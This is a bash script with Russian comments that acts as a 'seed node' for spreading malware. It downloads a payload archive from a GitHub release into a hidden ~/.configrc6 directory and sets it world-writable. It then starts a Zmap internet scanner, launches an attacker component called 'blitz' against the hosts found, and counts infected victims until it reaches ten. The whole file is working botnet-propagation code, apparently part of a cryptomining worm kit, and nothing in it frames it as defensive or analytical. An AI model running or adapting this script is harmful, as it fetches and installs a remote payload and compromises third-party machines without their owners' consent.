#!/bin/bash
# seed.sh — Seed-нода: ровно 10 заражений через blitz, затем остановка
#
# Логика: запускает Zmap-сканер, гонит blitz по найденным целям, считает
# заражения по v-файлу и останавливается после 10 (создаёт seed_done.txt).

INSTALL_DIR="$HOME/.configrc6"
SEED_DONE="$INSTALL_DIR/seed_done.txt"
VFILE="$INSTALL_DIR/c/v"
TARGETS="/tmp/zmap_results.txt"
MAX_INFECTED=10
WAIT_TIMEOUT=600   # секунд на ожидание целей

if [ -f "$SEED_DONE" ]; then
    echo "[SEED] Seed уже завершён (seed_done.txt существует), выход"
    exit 0
fi

# Убедимся, что blitz на месте
if [ ! -x "$INSTALL_DIR/c/blitz" ]; then
    echo "[SEED] blitz не найден, загружаем payload..."
    curl -sL "https://github.com/badmonner/dota/releases/download/v1.0/dota3.tar.gz" -o /tmp/dota3.tar.gz
    TMPD=$(mktemp -d)
    tar xzf /tmp/dota3.tar.gz -C "$TMPD" 2>/dev/null
    rm -rf "$INSTALL_DIR"
    mv "$TMPD/.configrc6" "$INSTALL_DIR" 2>/dev/null
    chmod 777 -R "$INSTALL_DIR" 2>/dev/null
fi

# Запуск сканера, если он ещё не гонится
if [ ! -f "$TARGETS" ] || [ ! -s "$TARGETS" ]; then
    echo "[SEED] Запускаем Zmap-сканер..."
    "$INSTALL_DIR/d/scan" > /dev/null 2>&1 &
fi

# Ждём целей (zmap пишет IP построчно)
echo "[SEED] Ждём цели из Zmap..."
for i in $(seq 1 $((WAIT_TIMEOUT / 5))); do
    if [ -s "$TARGETS" ]; then
        echo "[SEED] Найдено целей: $(grep -cE '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' "$TARGETS")"
        break
    fi
    sleep 5
done

if [ ! -s "$TARGETS" ]; then
    echo "[SEED] Цели не найдены за ${WAIT_TIMEOUT}с"
    exit 1
fi

# Пустим атакующий
echo "[SEED] Запускаем blitz..."
"$INSTALL_DIR/c/start" > /dev/null 2>&1 &

# Считаем заражения по v-файлу (первая строка — заголовок)
INFECTED=0
while [ $INFECTED -lt $MAX_INFECTED ]; do
    if [ -f "$VFILE" ]; then
        INFECTED=$(($(wc -l < "$VFILE") - 1))
        [ $INFECTED -lt 0 ] && INFECTED=0
    fi
    echo "[SEED] Заражено: $INFECTED/$MAX_INFECTED"
    if [ $INFECTED -ge $MAX_INFECTED ]; then
        break
    fi
    sleep 10
done

# Остановка и фиксация результата
"$INSTALL_DIR/c/stop" > /dev/null 2>&1
touch "$SEED_DONE"
echo "[SEED] Seed завершён: $INFECTED заражений"
